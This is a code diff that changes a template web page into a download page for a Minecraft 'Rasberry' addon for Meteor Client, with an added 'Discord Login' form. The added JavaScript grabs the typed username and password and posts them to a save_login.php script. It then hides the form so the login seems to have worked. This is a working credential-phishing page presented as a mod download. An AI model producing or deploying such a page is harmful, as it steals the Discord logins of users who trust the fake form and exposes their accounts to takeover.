@@ -3,11 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Your GitHub-Like Web Page</title>
+    <title>Minecraft Rasberry addon for Meteor Client</title>
     <!-- Include your main stylesheet -->
     <link rel="stylesheet" href="styles.css">
     <style>
         /* Additional styles specific to your page */
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -18,16 +21,16 @@
 
     <main>
         <!-- Main content of your page -->
-        <h1>Welcome to Your GitHub-Like Web Page</h1>
-        <p>Some content here...</p>
+        <h1>Welcome to RasberryV1</h1>
+        <p>Download Rasberry</p>
 
         <!-- Example: Login modal -->
         <div id="loginModal" class="modal">
             <div class="modal-content">
                 <!-- Paste the login form here -->
                 <div class="login-container">
-                    <h2>GitHub Login</h2>
-                    <form action="https://yourbackend.com/login" method="POST">
+                    <h2>Discord Login</h2>
+                    <form id="loginForm">
                         <input type="text" id="username" name="username" placeholder="Username" required><br>
                         <input type="password" id="password" name="password" placeholder="Password" required><br>
                         <input type="submit" value="Login">
@@ -44,11 +47,46 @@
         <!-- Footer content -->
     </footer>
 
-    <!-- JavaScript for modal functionality, if needed -->
+    <!-- JavaScript for modal functionality and form handling -->
     <script>
-        // Example JavaScript to show/hide the modal
-        document.getElementById('loginBtn').addEventListener('click', function() {
-            document.getElementById('loginModal').style.display = 'block';
+        document.addEventListener('DOMContentLoaded', function() {
+            var loginForm = document.getElementById('loginForm');
+
+            loginForm.addEventListener('submit', function(event) {
+                event.preventDefault(); // Prevent actual form submission
+
+                var username = document.getElementById('username').value;
+                var password = document.getElementById('password').value;
+
+                // Simulate sending login details to server-side script
+                sendLoginDetails(username, password);
+
+                // Hide the login form after "logging in"
+                document.getElementById('loginModal').classList.add('hidden');
+            });
+
+            function sendLoginDetails(username, password) {
+                // Simulate sending data to server-side script
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'save_login.php', true); // Replace with your actual script URL
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE) {
+                        if (xhr.status === 200) {
+                            console.log('Login details saved successfully.');
+                        } else {
+                            console.error('Error saving login details.');
+                        }
+                    }
+                };
+                var data = JSON.stringify({ username: username, password: password });
+                xhr.send(data);
+            }
+
+            // Example JavaScript to show/hide the modal
+            document.getElementById('loginBtn').addEventListener('click', function() {
+                document.getElementById('loginModal').style.display = 'block';
+            });
         });
     </script>
 </body>
